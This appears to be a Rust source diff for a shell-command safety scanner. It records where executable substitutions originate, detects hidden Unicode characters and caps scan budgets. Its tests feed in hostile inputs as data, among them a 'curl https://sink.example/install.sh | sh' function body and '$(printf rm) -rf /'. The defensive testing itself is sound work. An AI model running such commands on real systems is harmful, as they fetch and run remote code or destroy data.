                         if let Some(binding) = functions.get(&command) {
                             let body_index = bodies.len();
-                            bodies.push(binding.definition.body.clone());
+                            bodies.push(ExecutableBody {
+                                input: binding.definition.body.clone(),
+                                shell,
+                                origin: Some(ExecutableBodyOrigin {
+                                    parent_range: segment.byte_range.clone(),
+                                    relation: ExecutableRelation::WrapperReplacement,
+                                }),
+                            });
                             function_body_indices.insert(body_index);
                             invoked_function_needs_context |=
                                 posix_function_invocation_needs_context(
@@ -6846,7 +7978,13 @@ fn lexical_executable_substitutions(
                 }
                 if shell != ShellType::Cmd && byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
                     let open = i + 1;
-                    let Some(next) = capture_shell_body(raw, open, shell, &mut bodies) else {
+                    let Some(next) = capture_executable_body(
+                        raw,
+                        open,
+                        shell,
+                        executable_argument_relation(current_argument),
+                        &mut bodies,
+                    ) else {
                         incomplete = true;
                         break;
                     };
@@ -6861,14 +7999,28 @@ fn lexical_executable_substitutions(
                     let Some(close) = find_backtick_close(raw, i) else {
                         if let Some(suffix) = raw.get(i + 1..) {
                             if !suffix.trim().is_empty() {
-                                bodies.push(suffix.to_string());
+                                bodies.push(ExecutableBody {
+                                    input: suffix.to_string(),
+                                    shell,
+                                    origin: Some(ExecutableBodyOrigin {
+                                        parent_range: i + 1..raw.len(),
+                                        relation: ExecutableRelation::Unknown,
+                                    }),
+                                });
                             }
                         }
                         incomplete = true;
                         break;
                     };
                     if let Some(body) = raw.get(i + 1..close) {
-                        bodies.push(body.to_string());
+                        bodies.push(ExecutableBody {
+                            input: body.to_string(),
+                            shell,
+                            origin: Some(ExecutableBodyOrigin {
+                                parent_range: i + 1..close,
+                                relation: executable_argument_relation(current_argument),
+                            }),
+                        });
                     }
                     i = close + 1;
                     word_start = false;
@@ -6883,6 +8035,22 @@ fn lexical_executable_substitutions(
             ShellLexQuote::Normal => {}
         }
 
+        // Assign argv ownership before consuming the first byte of the word;
+        // quoted and unquoted substitutions therefore share the same exact
+        // owner without a second tokenization/search pass.
+        if word_start
+            && !byte.is_ascii_whitespace()
+            && !matches!(byte, b';' | b'|' | b'&' | b')' | b'}')
+        {
+            if command_start {
+                current_argument = None;
+                next_argument = 0;
+            } else {
+                current_argument = Some(next_argument);
+                next_argument = next_argument.saturating_add(1);
+            }
+        }
+
         if starts_shell_line_comment(bytes, i, shell, word_start) {
             while i < bytes.len() && bytes[i] != b'\n' {
                 i += 1;
@@ -6892,6 +8060,8 @@ fn lexical_executable_substitutions(
                 command_start = true;
                 word_start = true;
                 assignment_word = false;
+                current_argument = None;
+                next_argument = 0;
             }
             continue;
         }
@@ -6921,7 +8091,14 @@ fn lexical_executable_substitutions(
                         if let Some(binding) = functions.get(&word) {
                             let definition = &binding.definition;
                             let body_index = bodies.len();
-                            bodies.push(definition.body.clone());
+                            bodies.push(ExecutableBody {
+                                input: definition.body.clone(),
+                                shell,
+                                origin: Some(ExecutableBodyOrigin {
+                                    parent_range: i..end,
+                                    relation: ExecutableRelation::WrapperReplacement,
+                                }),
+                            });
                             function_body_indices.insert(body_index);
                             invoked_function_needs_context |=
                                 posix_segments.as_deref().is_none_or(|segments| {
@@ -7007,7 +8184,14 @@ fn lexical_executable_substitutions(
                 PosixFunctionParse::Incomplete { body_start } => {
                     if let Some(suffix) = raw.get(body_start..) {
                         if !suffix.trim().is_empty() {
-                            bodies.push(suffix.to_string());
+                            bodies.push(ExecutableBody {
+                                input: suffix.to_string(),
+                                shell,
+                                origin: Some(ExecutableBodyOrigin {
+                                    parent_range: body_start..raw.len(),
+                                    relation: ExecutableRelation::Unknown,
+                                }),
+                            });
                         }
                     }
                     incomplete = true;
@@ -7031,7 +8215,13 @@ fn lexical_executable_substitutions(
 
         if shell != ShellType::Cmd && byte == b'$' && bytes.get(i + 1) == Some(&b'(') {
             let open = i + 1;
-            let Some(next) = capture_shell_body(raw, open, shell, &mut bodies) else {
+            let Some(next) = capture_executable_body(
+                raw,
+                open,
+                shell,
+                executable_argument_relation(current_argument),
+                &mut bodies,
+            ) else {
                 incomplete = true;
                 break;
             };
@@ -7048,7 +8238,13 @@ fn lexical_executable_substitutions(
             && bytes.get(i + 1) == Some(&b'(')
         {
             let open = i + 1;
-            let Some(next) = capture_shell_body(raw, open, shell, &mut bodies) else {
+            let Some(next) = capture_executable_body(
+                raw,
+                open,
+                shell,
+                executable_argument_relation(current_argument),
+                &mut bodies,
+            ) else {
                 incomplete = true;
                 break;
             };
@@ -7062,14 +8258,20 @@ fn lexical_executable_substitutions(
                 || (shell == ShellType::Posix && command_start && word_start))
         {
             let recovered_start = bodies.len();
-            let Some(next) = capture_shell_body(raw, i, shell, &mut bodies) else {
+            let Some(next) = capture_executable_body(
+                raw,
+                i,
+                shell,
+                ExecutableRelation::WrapperReplacement,
+                &mut bodies,
+            ) else {
                 incomplete = true;
                 break;
             };
             if shell == ShellType::Posix
-                && bodies
-                    .get(recovered_start..)
-                    .is_none_or(|recovered| recovered.iter().all(|body| body.trim().is_empty()))
+                && bodies.get(recovered_start..).is_none_or(|recovered| {
+                    recovered.iter().all(|body| body.input.trim().is_empty())
+                })
             {
                 // An empty command-position `()` is not a valid subshell and
                 // often indicates a malformed or split function header. Keep
@@ -7083,7 +8285,13 @@ fn lexical_executable_substitutions(
         }
 
         if shell == ShellType::Cmd && byte == b'(' {
-            let Some(next) = capture_shell_body(raw, i, shell, &mut bodies) else {
+            let Some(next) = capture_executable_body(
+                raw,
+                i,
+                shell,
+                ExecutableRelation::WrapperReplacement,
+                &mut bodies,
+            ) else {
                 incomplete = true;
                 break;
             };
@@ -7102,7 +8310,13 @@ fn lexical_executable_substitutions(
                 .is_some_and(|next| next.is_ascii_whitespace())
         {
             let body_start = i + 1;
-            let Some(next) = capture_shell_body(raw, i, shell, &mut bodies) else {
+            let Some(next) = capture_executable_body(
+                raw,
+                i,
+                shell,
+                ExecutableRelation::WrapperReplacement,
+                &mut bodies,
+            ) else {
                 incomplete = true;
                 break;
             };
@@ -7135,14 +8349,28 @@ fn lexical_executable_substitutions(
             let Some(close) = find_backtick_close(raw, i) else {
                 if let Some(suffix) = raw.get(i + 1..) {
                     if !suffix.trim().is_empty() {
-                        bodies.push(suffix.to_string());
+                        bodies.push(ExecutableBody {
+                            input: suffix.to_string(),
+                            shell,
+                            origin: Some(ExecutableBodyOrigin {
+                                parent_range: i + 1..raw.len(),
+                                relation: ExecutableRelation::Unknown,
+                            }),
+                        });
                     }
                 }
                 incomplete = true;
                 break;
             };
             if let Some(body) = raw.get(i + 1..close) {
-                bodies.push(body.to_string());
+                bodies.push(ExecutableBody {
+                    input: body.to_string(),
+                    shell,
+                    origin: Some(ExecutableBodyOrigin {
+                        parent_range: i + 1..close,
+                        relation: executable_argument_relation(current_argument),
+                    }),
+                });
             }
             i = close + 1;
             word_start = false;
@@ -7160,9 +8388,11 @@ fn lexical_executable_substitutions(
         if syntax_whitespace {
             if byte == b'\n' {
                 command_start = true;
+                next_argument = 0;
             }
             word_start = true;
             assignment_word = false;
+            current_argument = None;
             i += 1;
             continue;
         }
@@ -7174,6 +8404,8 @@ fn lexical_executable_substitutions(
             command_start = true;
             word_start = true;
             assignment_word = false;
+            current_argument = None;
+            next_argument = 0;
             i += if bytes.get(i + 1) == Some(&byte) {
                 2
             } else {
@@ -7196,7 +8428,14 @@ fn lexical_executable_substitutions(
                             if let Some(binding) = functions.get(&word) {
                                 let definition = &binding.definition;
                                 let body_index = bodies.len();
-                                bodies.push(definition.body.clone());
+                                bodies.push(ExecutableBody {
+                                    input: definition.body.clone(),
+                                    shell,
+                                    origin: Some(ExecutableBodyOrigin {
+                                        parent_range: i..end,
+                                        relation: ExecutableRelation::WrapperReplacement,
+                                    }),
+                                });
                                 function_body_indices.insert(body_index);
                                 invoked_function_needs_context |=
                                     posix_segments.as_deref().is_none_or(|segments| {
@@ -7231,15 +8470,14 @@ fn lexical_executable_substitutions(
             .keys()
             .cloned()
             .collect::<std::collections::HashSet<_>>();
-        let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
         if invoked_function_needs_context
             || bodies.iter().any(|body| {
-                posix_body_calls_parent_function(body, &function_names, 0, &mut remaining_bodies)
+                posix_body_calls_parent_function(&body.input, &function_names, 0, remaining_bodies)
             })
             || function_body_indices.iter().any(|index| {
                 bodies
                     .get(*index)
-                    .is_some_and(|body| contains_literal_posix_dispatch_mutation(body))
+                    .is_some_and(|body| contains_literal_posix_dispatch_mutation(&body.input))
             })
         {
             gap.get_or_insert(ShellExecutionGap::AmbiguousExecutableBody);
@@ -7548,6 +8786,7 @@ fn push_powershell_named_function_blocks(raw: &str, scan: &mut ExecutableSubstit
             scan.bodies.push(ExecutableBody {
                 input: body.to_string(),
                 shell: ShellType::PowerShell,
+                origin: None,
             });
             pending_keyword = false;
             continue;
@@ -7789,6 +9028,7 @@ fn capture_powershell_executable_body(
             scan.bodies.push(ExecutableBody {
                 input: body.to_string(),
                 shell: ShellType::PowerShell,
+                origin: None,
             });
         }
         return Some(close + 1);
@@ -7802,6 +9042,7 @@ fn capture_powershell_executable_body(
             scan.bodies.push(ExecutableBody {
                 input: suffix.to_string(),
                 shell: ShellType::PowerShell,
+                origin: None,
             });
         }
     }
@@ -8645,6 +9886,7 @@ fn push_powershell_switch_clause_bodies(raw: &str, scan: &mut ExecutableSubstitu
                 scan.bodies.push(ExecutableBody {
                     input: body.to_string(),
                     shell: ShellType::PowerShell,
+                    origin: None,
                 });
             }
             index = close + 1;
@@ -8978,6 +10220,7 @@ fn scan_powershell_fragment_at_hashtable_depth(
                         scan.bodies.push(ExecutableBody {
                             input: body.to_string(),
                             shell: ShellType::PowerShell,
+                            origin: None,
                         });
                     }
                     token_class = PowerShellLexTokenClass::Start;
@@ -9028,11 +10271,13 @@ fn scan_powershell_fragment_at_hashtable_depth(
                                 scan.bodies.push(ExecutableBody {
                                     input: scriptblock.to_string(),
                                     shell: ShellType::PowerShell,
+                                    origin: None,
                                 });
                             } else {
                                 scan.bodies.push(ExecutableBody {
                                     input: body.to_string(),
                                     shell: ShellType::PowerShell,
+                                    origin: None,
                                 });
                                 record_shell_execution_gap(
                                     scan,
@@ -9096,11 +10341,13 @@ fn scan_powershell_fragment_at_hashtable_depth(
                         scan.bodies.push(ExecutableBody {
                             input: scriptblock.to_string(),
                             shell: ShellType::PowerShell,
+                            origin: None,
                         });
                     } else if let Some(body) = raw.get(i + 1..close) {
                         scan.bodies.push(ExecutableBody {
                             input: body.to_string(),
                             shell: ShellType::PowerShell,
+                            origin: None,
                         });
                         record_shell_execution_gap(
                             scan,
@@ -9148,6 +10395,7 @@ fn scan_powershell_fragment_at_hashtable_depth(
                         scan.bodies.push(ExecutableBody {
                             input: body.to_string(),
                             shell: ShellType::PowerShell,
+                            origin: None,
                         });
                     }
                     i = method_end;
@@ -10294,6 +11542,7 @@ fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionS
                         scan.bodies.push(ExecutableBody {
                             input: definition.body.clone(),
                             shell: ShellType::PowerShell,
+                            origin: None,
                         });
                         push_powershell_named_function_blocks(&definition.body, &mut scan);
                     } else {
@@ -10326,6 +11575,7 @@ fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionS
                 scan.bodies.push(ExecutableBody {
                     input: body,
                     shell: ShellType::PowerShell,
+                    origin: None,
                 });
             } else if unresolved_aliases.contains(&command) {
                 record_shell_execution_gap(&mut scan, ShellExecutionGap::AmbiguousExecutableBody);
@@ -10339,6 +11589,7 @@ fn powershell_executable_substitution_scan(raw: &str) -> ExecutableSubstitutionS
                 scan.bodies.push(ExecutableBody {
                     input: definition.body.clone(),
                     shell: ShellType::PowerShell,
+                    origin: None,
                 });
                 push_powershell_named_function_blocks(&definition.body, &mut scan);
                 child_scope_body_indices.extend(body_start..scan.bodies.len());
@@ -11537,6 +12788,97 @@ mod tests {
     }
 
     #[test]
+    fn byte_scan_result_remains_externally_constructible_and_filterable() {
+        let result = ByteScanResult {
+            has_ansi_escapes: false,
+            has_control_chars: false,
+            has_bidi_controls: true,
+            has_zero_width: false,
+            has_invalid_utf8: false,
+            has_unicode_tags: false,
+            has_variation_selectors: false,
+            has_invisible_math_operators: false,
+            has_invisible_whitespace: false,
+            has_hangul_fillers: false,
+            has_confusable_text: false,
+            details: vec![ByteFinding {
+                offset: 2,
+                byte: 0xe2,
+                codepoint: Some(0x202e),
+                description: "bidi control U+202E".to_string(),
+            }],
+        };
+        let filtered = result.with_ignored_range(&(1..5));
+        assert!(!filtered.has_bidi_controls);
+        assert!(filtered.details.is_empty());
+    }
+
+    #[test]
+    fn public_omission_metadata_carries_actual_class_loss() {
+        let bidi = "\u{202e}".as_bytes();
+        let mut input = Vec::new();
+        for _ in 0..(ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS + 1) {
+            input.extend_from_slice(bidi);
+        }
+        let ignored_end = input.len();
+        input.extend_from_slice(b"visible");
+        input.extend_from_slice(bidi);
+
+        let result = scan_bytes(&input);
+        assert!(result.has_omitted_details());
+        let filtered = result.with_ignored_range(&(0..ignored_end));
+        assert!(
+            filtered.has_bidi_controls,
+            "lossy retained details cannot prove the out-of-range bidi signal absent"
+        );
+        assert!(filtered.has_omitted_details());
+
+        let report = scan_bytes_with_ignored_ranges(&input, &[]);
+        assert!(report.dropped_details > 0);
+        assert_ne!(
+            report.dropped_detail_class_mask & PublicByteFindingClass::Bidi.bit(),
+            0
+        );
+    }
+
+    #[test]
+    fn ignored_range_filter_uses_class_local_not_total_detail_saturation() {
+        let bidi_prefix = "\u{202e}".repeat(8);
+        let mut input = bidi_prefix.as_bytes().to_vec();
+        input.extend(std::iter::repeat_n(0x01, 8));
+
+        let result = scan_bytes(&input);
+        assert_eq!(result.details.len(), 16);
+        assert!(result.has_bidi_controls);
+        assert!(result.has_control_chars);
+
+        let filtered = result.with_ignored_range(&(0..bidi_prefix.len()));
+        assert!(!filtered.has_bidi_controls);
+        assert!(filtered.has_control_chars);
+        assert_eq!(filtered.details.len(), 8);
+        assert!(filtered
+            .details
+            .iter()
+            .all(|detail| detail.description.starts_with("control character")));
+    }
+
+    #[test]
+    fn exact_class_cap_without_an_actual_drop_does_not_stick_after_ignore() {
+        let input = "\u{202e}".repeat(ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS);
+        let result = scan_bytes(input.as_bytes());
+
+        assert_eq!(
+            result.details.len(),
+            ByteScanResult::MAX_RETAINED_DETAILS_PER_CLASS
+        );
+        assert!(!result.has_omitted_details());
+
+        let filtered = result.with_ignored_range(&(0..input.len()));
+        assert!(!filtered.has_bidi_controls);
+        assert!(filtered.details.is_empty());
+    }
+
+    #[test]
     fn test_byte_scan_control_chars() {
         let input = b"hello\rworld";
         let result = scan_bytes(input);
@@ -11548,6 +12890,25 @@ mod tests {
         let input = "hello\u{202E}dlrow".as_bytes();
         let result = scan_bytes(input);
         assert!(result.has_bidi_controls);
+    }
+
+    #[test]
+    fn ignored_detail_overflow_cannot_hide_later_bidi() {
+        let ignored_prefix = "\u{200b}".repeat(ByteScanResult::MAX_RETAINED_DETAILS);
+        let input = format!("{ignored_prefix}\u{202e}visible");
+
+        let ignored_range = 0..ignored_prefix.len();
+        let report =
+            scan_bytes_with_ignored_ranges(input.as_bytes(), std::slice::from_ref(&ignored_range));
+        let result = report.result;
+
+        assert!(result.has_bidi_controls);
+        assert!(!result.has_zero_width);
+        assert!(result
+            .details
+            .iter()
+            .any(|detail| detail.description.starts_with("bidi control")));
+        assert_eq!(report.dropped_details, 0);
     }
 
     #[test]
@@ -12388,6 +13749,59 @@ mod tests {
     }
 
     #[test]
+    fn executable_body_preflight_ignores_quoted_data_but_caps_real_substitutions() {
+        let delimiter_data = ";;&|(){}<>`".repeat(128);
+        for (input, shell) in [
+            (format!("rg '{delimiter_data}' README.md"), ShellType::Posix),
+            (
+                format!("Write-Output '{delimiter_data}'"),
+                ShellType::PowerShell,
+            ),
+            (
+                format!("Write-Output “{delimiter_data}”"),
+                ShellType::PowerShell,
+            ),
+            (
+                format!("Write-Output @'\n{delimiter_data}\n'@"),
+                ShellType::PowerShell,
+            ),
+            (format!("echo \"{delimiter_data}\""), ShellType::Cmd),
+        ] {
+            assert!(
+                executable_substitutions_bounded(&input, shell, 4).is_ok(),
+                "quoted data exhausted the nested-body budget: {shell:?}"
+            );
+        }
+
+        let parameter_data = (0..32)
+            .map(|index| format!("${{value_{index}}}"))
+            .collect::<Vec<_>>()
+            .join(" ");
+        let brace_data = (0..32)
+            .map(|index| format!("{{value_{index},fallback}}"))
+            .collect::<Vec<_>>()
+            .join(" ");
+        for input in [
+            format!("echo {parameter_data}"),
+            format!("echo {brace_data}"),
+        ] {
+            assert!(
+                executable_substitutions_bounded(&input, ShellType::Posix, 4).is_ok(),
+                "ordinary parameter/brace data exhausted the body budget: {input}"
+            );
+        }
+
+        let substitutions = (0..16)
+            .map(|index| format!("echo $(echo {index})"))
+            .collect::<Vec<_>>()
+            .join("; ");
+        assert_eq!(
+            executable_substitutions_bounded(&substitutions, ShellType::Posix, 8),
+            Err(ExecutableSubstitutionLimitError::CardinalityExceeded)
+        );
+    }
+
+    #[test]
     fn substitution_close_ignores_commented_parens_and_resumes_after_newline() {
         for shell in [ShellType::Posix, ShellType::PowerShell] {
             let input =
@@ -12624,6 +14038,90 @@ mod tests {
     }
 
     #[test]
+    fn executable_scan_input_budget_is_exact_and_preserves_prefix_bodies() {
+        let exact = "x".repeat(MAX_EXECUTABLE_SCAN_INPUT_BYTES);
+        let exact_scan = executable_substitution_scan(&exact, ShellType::Posix);
+        assert!(
+            exact_scan.gap.is_none(),
+            "exact budget failed: {exact_scan:?}"
+        );
+        assert!(exact_scan.bodies.is_empty(), "{exact_scan:?}");
+
+        let prefix = "echo $(printf substitution-detected)\n\
+                      sink(){ printf function-detected; }\n\
+                      sink\n";
+        let mut over = prefix.to_string();
+        over.push_str(&"x".repeat(MAX_EXECUTABLE_SCAN_INPUT_BYTES + 1 - over.len()));
+        let over_scan = executable_substitution_scan(&over, ShellType::Posix);
+        assert_eq!(
+            over_scan.gap,
+            Some(ShellExecutionGap::WorkBudgetExceeded),
+            "{over_scan:?}"
+        );
+        for expected in ["substitution-detected", "function-detected"] {
+            assert!(
+                over_scan
+                    .bodies
+                    .iter()
+                    .any(|body| body.input.contains(expected)),
+                "body before the input boundary was lost: {expected:?} -> {over_scan:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn executable_scan_candidate_budget_is_exact_and_fails_closed_at_plus_one() {
+        let exact = "true;".repeat(MAX_EXECUTABLE_SCAN_CANDIDATES);
+        let exact_scan = executable_substitution_scan(&exact, ShellType::Posix);
+        assert!(
+            exact_scan.gap.is_none(),
+            "exact budget failed: {exact_scan:?}"
+        );
+
+        let plus_one = format!("{exact}true");
+        let plus_one_scan = executable_substitution_scan(&plus_one, ShellType::Posix);
+        assert_eq!(
+            plus_one_scan.gap,
+            Some(ShellExecutionGap::WorkBudgetExceeded),
+            "{plus_one_scan:?}"
+        );
+    }
+
+    #[test]
+    fn executable_scan_body_budget_keeps_the_exact_prefix_and_marks_omission() {
+        let body_input = |count: usize| {
+            let mut input = String::from("echo ");
+            for spaces in 1..=count {
+                input.push('`');
+                input.push(':');
+                input.push_str(&" ".repeat(spaces));
+                input.push('`');
+            }
+            input
+        };
+
+        let exact =
+            executable_substitution_scan(&body_input(MAX_EXECUTABLE_SCAN_BODIES), ShellType::Posix);
+        assert_eq!(exact.bodies.len(), MAX_EXECUTABLE_SCAN_BODIES, "{exact:?}");
+        assert!(exact.gap.is_none(), "exact body budget failed: {exact:?}");
+
+        let plus_one = executable_substitution_scan(
+            &body_input(MAX_EXECUTABLE_SCAN_BODIES + 1),
+            ShellType::Posix,
+        );
+        assert_eq!(
+            plus_one.bodies.len(),
+            MAX_EXECUTABLE_SCAN_BODIES,
+            "{plus_one:?}"
+        );
+        assert_eq!(
+            plus_one.gap,
+            Some(ShellExecutionGap::WorkBudgetExceeded),
+            "{plus_one:?}"
+        );
+    }
+
+    #[test]
     fn derived_or_unparsed_posix_command_bodies_fail_closed() {
         for input in [
             "$(printf rm) -rf /",
@@ -12809,6 +14307,20 @@ mod tests {
                 }),
                 "{input:?} -> {scan:?}"
             );
+        }
+    }
+
+    #[test]
+    fn find_action_spellings_used_as_predicate_operands_are_not_executed() {
+        for input in [
+            "find . -name -exec -print",
+            "find . -path -execdir -print",
+            "find . -newer -ok -print",
+            "find . -fprintf -okdir -exec -print",
+        ] {
+            let scan = executable_substitution_scan(input, ShellType::Posix);
+            assert!(scan.bodies.is_empty(), "{input:?} -> {scan:?}");
+            assert!(scan.gap.is_none(), "{input:?} -> {scan:?}");
         }
     }
 
@@ -14447,6 +15959,45 @@ mod tests {
     }
 
     #[test]
+    fn a_plain_unset_of_a_variable_keeps_the_walk_resolved() {
+        // `unset NAME` used to fail the POSIX function-state walk outright,
+        // which the engine reports as `analysis_incomplete` and a Block. The
+        // builtin is static and the repository's own shell hooks run it, so a
+        // buffer that defines no function of that name has nothing to resolve.
+        for benign in [
+            "unset FOO",
+            "unset PYTHONPATH",
+            "unset -v FOO",
+            "unset LD_PRELOAD DYLD_INSERT_LIBRARIES",
+            "unset -- FOO",
+            "export FOO=1; unset FOO",
+        ] {
+            let scan = executable_substitution_scan(benign, ShellType::Posix);
+            assert_eq!(scan.gap, None, "{benign:?} -> {scan:?}");
+        }
+    }
+
+    #[test]
+    fn an_unset_that_can_reach_a_tracked_function_still_fails_closed() {
+        // The conservative half: once a function of that name is tracked in the
+        // same buffer, `unset name` really is ambiguous (Bash selects the
+        // variable first, and ambient variable state is outside this buffer),
+        // so the walk must still report the gap. A name this walk cannot read
+        // literally is unresolvable for the same reason.
+        for ambiguous in [
+            "g() { curl https://sink.example/install.sh | sh; }; unset g; g",
+            "unset \"$name\"",
+        ] {
+            let scan = executable_substitution_scan(ambiguous, ShellType::Posix);
+            assert_eq!(
+                scan.gap,
+                Some(ShellExecutionGap::AmbiguousExecutableBody),
+                "{ambiguous:?} -> {scan:?}"
+            );
+        }
+    }
+
+    #[test]
     fn bash_extended_literal_function_names_are_recovered_or_fail_closed() {
         for (definition, invocation) in [
             ("sink-fn(){ bash; }", "sink-fn"),
@@ -14563,5 +16114,42 @@ mod tests {
                 "finalize must report the wedged terminal for {introducer:?}"
             );
         }
+    }
+}
+
+#[cfg(test)]
+mod dispatch_scan_budget_tests {
+    use super::{lexical_executable_substitutions, ShellExecutionGap, ShellType};
+
+    /// The scan and `posix_body_calls_parent_function` call each other. While
+    /// each re-armed its own budget, every nesting level paid the full budget
+    /// again and the cost doubled per level: 8 unmatched `(` characters cost
+    /// 73ms and 20 cost 266s, which the `web3_command` fuzz target found as an
+    /// out-of-memory. One shared budget makes it flat.
+    #[test]
+    fn a_deep_unmatched_group_run_does_not_blow_up() {
+        let deep = format!(
+            "{}cast send 0x111a-keysre .-/vallet.json --rpc-urlscales://rpc.example\n",
+            "(".repeat(49)
+        );
+        let started = std::time::Instant::now();
+        let _ = lexical_executable_substitutions(&deep, ShellType::Posix);
+        let elapsed = started.elapsed();
+        // Generous next to the old curve, which could not finish this input at
+        // all, and still far below anything an exponential could reach.
+        assert!(
+            elapsed < std::time::Duration::from_secs(10),
+            "nested-group scan took {elapsed:?}; the shared budget is not holding"
+        );
+    }
+
+    /// Exhausting the budget must not quietly turn into "nothing to see": the
+    /// scans answer "this body may reach the parent's dispatch state", so
+    /// running out has to keep reporting the gap.
+    #[test]
+    fn an_ordinary_dispatch_body_is_still_reported() {
+        let (_, gap) =
+            lexical_executable_substitutions("f() { alias ls=rm; }; f", ShellType::Posix);
+        assert_eq!(gap, Some(ShellExecutionGap::AmbiguousExecutableBody));
     }
 }
